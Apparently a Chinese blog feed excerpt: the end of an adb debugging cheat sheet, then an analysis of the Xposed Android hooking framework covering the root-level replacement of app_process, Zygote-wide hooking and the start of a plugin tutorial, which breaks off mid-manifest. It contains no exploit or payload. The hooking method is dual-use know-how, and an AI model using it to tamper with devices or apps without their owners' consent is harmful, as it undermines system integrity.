<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
</li>
<li><p>zygote的堆栈dump</p>
<blockquote>
<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
<ul>
<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
</blockquote>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>获取编译时间<br><code>cat /proc/version</code></p>
</li>
<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
</li>
<li><p>获取硬件信息<br><c]]>
    </summary>
    
      <category term="adb" scheme="http://blog.idhyt.com/tags/adb/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
    <link href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/"/>
    <id>http://blog.idhyt.com/2015/09/25/android-injection-xposed/</id>
    <published>2015-09-24T18:29:11.000Z</published>
    <updated>2017-01-02T09:07:33.000Z</updated>
    <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="主要模块说明如下：">主要模块说明如下：</h4><p><strong>Xposed</strong>：Xposed的C++部分，主要是用来替换/system/bin/app_process，并为XposedBridge提供JNI方法。</p>
<p><strong>XposedInstaller</strong>：Xposed的安装包，负责配置Xposed工作的环境并且提供对基于Xposed框架的Modules的管理。在安装XposedInstaller之后，app_process与XposedBridge.jar放置在了/data/data/de.robv.android.xposed.installer。</p>
<p><strong>XposedBridge.jar</strong>：XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互。/system/bin/app_process进程启动过程中会加载该jar包，其它的Modules的开发与运行都是基于该jar包的。注意：XposedBridge.jar文件本质上是由XposedBridge生成的APK文件更名而来，查看该工程目录下的install.bat</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /d %~dp0</span><br><span class="line">dir bin\XposedBridge.apk</span><br><span class="line">adb push bin\XposedBridge.apk /data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar.newversion</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p><strong>XposedMods</strong>：使用Xposed开发的一些Modules，其中AppSettings是一个可以进行权限动态管理的应用</p>
<h4 id="Xposed框架的基本运行环境如下：">Xposed框架的基本运行环境如下：</h4><table>
<thead>
<tr>
<th>Configuration</th>
<th>RequireMent</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root Access</td>
<td>因为Xposed工作原理是在/system/bin目录下替换文件，在install的时候需要root权限，但是运行时不需要root权限</td>
</tr>
<tr>
<td>版本要求</td>
<td>需要在Android 4.0以上版本的机器中</td>
</tr>
</tbody>
</table>
<h3 id="源码分析">源码分析</h3><h4 id="XposedInstaller">XposedInstaller</h4><p>通过<code>/XposedInstaller/AndroidManifest.xml</code>看出主activity为WelcomeActivity，<br>主要实现了界面加载，添加功能图标和描述信息Item，如Install, Modules, Download等。<br>选择Framework后进入界面<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-1.jpg" alt="android-xposed-1"></p>
<p>我们直接找到install代码，install代码定位的简单方法：<br>先点击install进入安装界面，然后在输入adb命令查看当前最顶层activity，就可以定位到代码。</p>
<p>adb 查看最上层成activity名字<br>linux: <code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows: <code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
<p>最后定位到install代码位于InstallerFragment中，代码及注释如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该代码的功能就是替换了app_process文件</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取安装的方式，直接写入 or 使用 recovery进行安装</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> installMode = getInstallMode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查获取Root权限</span></span><br><span class="line">    <span class="keyword">if</span> (!startShell())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; messages = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">boolean</span> showAlert = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        messages.add(getString(R.string.sdcard_location, XposedApp.getInstance().getExternalFilesDir(<span class="keyword">null</span>)));</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把Xposed-Disabler-Recovery.zip文件 从asset copy到sdcard中</span></span><br><span class="line">        <span class="keyword">if</span> (AssetUtil.writeAssetToSdcardFile(<span class="string">"Xposed-Disabler-Recovery.zip"</span>, <span class="number">00644</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将编译后的app_process二进制文件，从asset文件夹中，copy到/data/data/de.robv.android.xposed.installer/bin/app_process</span></span><br><span class="line">        File appProcessFile = AssetUtil.writeAssetToFile(APP_PROCESS_NAME, <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"bin/app_process"</span>), <span class="number">00700</span>);</span><br><span class="line">        <span class="keyword">if</span> (appProcessFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            showAlert(getString(R.string.file_extract_failed, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            <span class="comment">// 普通安装模式</span></span><br><span class="line">            <span class="comment">// 重新挂载/system为rw模式</span></span><br><span class="line">            <span class="comment">// Normal installation</span></span><br><span class="line">            messages.add(getString(R.string.file_mounting_writable, <span class="string">"/system"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"mount -o remount,rw /system"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_mount_writable_failed, <span class="string">"/system"</span>));</span><br><span class="line">                messages.add(getString(R.string.file_trying_to_continue));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查看原有的app_process文件是否已经备份，如果没有备份，现将原有的app_process文件备份一下</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File(<span class="string">"/system/bin/app_process.orig"</span>).exists()) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_backup_already_exists, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a /system/bin/app_process /system/bin/app_process.orig"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                    messages.add(<span class="string">""</span>);</span><br><span class="line">                    messages.add(getString(R.string.file_backup_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    messages.add(getString(R.string.file_backup_successful, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将项目中的自定义app_process文件copy覆盖系统的app_process,修改权限</span></span><br><span class="line">            messages.add(getString(R.string.file_copying, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a "</span> + appProcessFile.getAbsolutePath() + <span class="string">" /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_copy_failed, <span class="string">"app_process"</span>, <span class="string">"/system/bin"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chmod 755 /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_perms_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chown root:shell /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_owner_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_AUTO) &#123;</span><br><span class="line">            <span class="comment">// 自动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareAutoFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_MANUAL) &#123;</span><br><span class="line">            <span class="comment">// 手动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareManualFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File blocker = <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"conf/disabled"</span>);</span><br><span class="line">        <span class="keyword">if</span> (blocker.exists()) &#123;</span><br><span class="line">            messages.add(getString(R.string.file_removing, blocker.getAbsolutePath()));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"rm "</span> + blocker.getAbsolutePath(), messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_remove_failed, blocker.getAbsolutePath()));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy XposedBridge.jar 到私有目录，XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互</span></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">        File jarFile = AssetUtil.writeAssetToFile(<span class="string">"XposedBridge.jar"</span>, <span class="keyword">new</span> File(JAR_PATH_NEWVERSION), <span class="number">00644</span>);</span><br><span class="line">        <span class="keyword">if</span> (jarFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 将有关文件系统的存储器常驻信息送入物理介质内，在暂停系统之前,比如要重新启动机器,一定要去执行sync命令</span></span><br><span class="line">        mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line"></span><br><span class="line">        showAlert = <span class="keyword">false</span>;</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL)</span><br><span class="line">            offerReboot(messages);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            offerRebootToRecovery(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>, installMode);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 删除busybox 工具库</span></span><br><span class="line">        AssetUtil.removeBusybox();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (showAlert)</span><br><span class="line">            showAlert(TextUtils.join(<span class="string">"\n"</span>, messages).trim());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="为什么要替换app_process">为什么要替换app_process</h4><p>在android的源码中的init.rc文件可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process -Xzygote /system/bin –zygote –start-system-server</span><br><span class="line">socket zygote stream <span class="number">666</span> </span><br><span class="line">onrestart write /sys/android_power/request_state wake</span><br><span class="line">onrestart write /sys/power/state on</span><br><span class="line">onrestart restart media</span><br><span class="line">onrestart restart netd</span><br></pre></td></tr></table></figure>
<p>app_process是andriod app的启动程序，该注入框架通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。与采取传统的Inhook方式<a href="http://www.mulliner.org/android/feed/mulliner_dbi_hitb_kul2013.pdf" target="_blank" rel="external">Dynamic Dalvik Instrumentation</a>相比，Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>
<h4 id="为什么要控制zygote进程">为什么要控制zygote进程</h4><p>在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。所以如果选择对Zygote进程Hook，则能够达到针对系统上所有的应用程序进程Hook，即一个全局Hook。这也是Xposed选择替换app_process的原因。如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-2.jpg" alt="hook-before-after"></p>
<p>Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。</p>
<h4 id="Hook/Replace">Hook/Replace</h4><p>Xposed 框架中真正起作用的是对方法的hook。在Repackage技术中，如果要对APK做修改，则需要修改Smali代码中的指令。而另一种动态修改指令的技术需要在程序运行时基于匹配搜索来替换smali代码，但因为方法声明的多样性与复杂性，这种方法也比较复杂。</p>
<p>总结Hook运行过程如下：</p>
<ol>
<li><p>在Android系统启动的时候，zygote进程加载XposedBridge将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法xposedCallHandler，xposedCallHandler在转入handleHookedMethod这个Java方法执行用户规定的Hook Func。</p>
</li>
<li><p>在hookMethodNative的实现中,会调用XposedBridge中的handleHookedMethod这个方法来传递参数;<br>XposedBridge这个jar包含有一个私有的本地方法：hookMethodNative，该方法在附加的app_process程序中也得到了实现。它将一个方法对象作为输入参数（你可以使用Java的反射机制来获取这个方法）并且改变Dalvik虚拟机中对于该方法的定义。它将该方法的类型改变为native并且将这个方法的实现链接到它的本地的通用类的方法。换言之，当调用那个被hook的方法时候，通用的类方法会被调用而不会对调用者有任何的影响。</p>
</li>
<li><p>handleHookedMethod这个方法类似于一个统一调度的Dispatch例程,其对应的底层的C++函数是xposedCallHandler;</p>
</li>
<li><p>handleHookedMethod实现里面会根据一个全局结构hookedMethodCallbacks来选择相应的hook函数,并调用他们的before,after函数;</p>
</li>
<li><p>当多模块同时Hook一个方法的时候，Xposed会自动根据Module的优先级来排序，调用顺序如下：<br>A.before -&gt; B.before -&gt; original method -&gt; B.after -&gt; A.after</p>
</li>
</ol>
<h4 id="Xposed代码分析">Xposed代码分析</h4><p>详见<a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="external">Android Hook框架Xposed原理与源代码分析</a></p>
<h3 id="Xposed插件编写">Xposed插件编写</h3><p>创建一个插件XposedExample，hook掉系统handleLoadPackage，在系统调用之前打印出加载app的package name，工程用eclipse编写，android studio略有不同。</p>
<p>1.创建一个Blank Activity的android项目</p>
<p>2.工程目录新建lib文件夹，添加文件<a href="http://forum.xda-developers.com/xposed/xposed-api-changelog-developer-news-t2714067" target="_blank" rel="external">XposedBridgeApi-54.jar</a>，然后右键-Build path。</p>
<p>3.修改AndroidManifest.xml，插入xposed元数据。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不想让插件在系统中显示图标，就把activity给注释掉。</p>
<p>4.完整的的AndroidManifest.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">manifest</span> <span class="attribute">xmlns:android</span>=<span class="value">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    <span class="attribute">package</span>=<span class="value">"com.idhyt.xposedexample"</span></span><br><span class="line">    <span class="attribute">android:versionCode</span>=<span class="value">"1"</span></span><br><span class="line">    <span class="attribute">android:versionName</span>=<span class="value">"1.0"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">uses-sdk</span></span><br><span class="line">        <span class="attribute">android:minSdkVersion</span>=<span class="value">"8"</span></span><br><span class="line">        <span class="attribute">android:targetSdkVersion</span>=<span class="value">"21"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">application</span></span><br><span class="line">        <span class="attribute">android:allowBackup</span>=<span class="value">"true"</span></span><br><span class="line">        <span class="attribute">android:icon</span>=<span class="value">"@drawable/ic_launcher"</span></span><br><span class="line">        <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span></span><br><span class="line">        <span class="attribute">android:theme</span>=<span class="value">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">         <span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">".XposedExample"</span></span><br><span class="line">            <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span 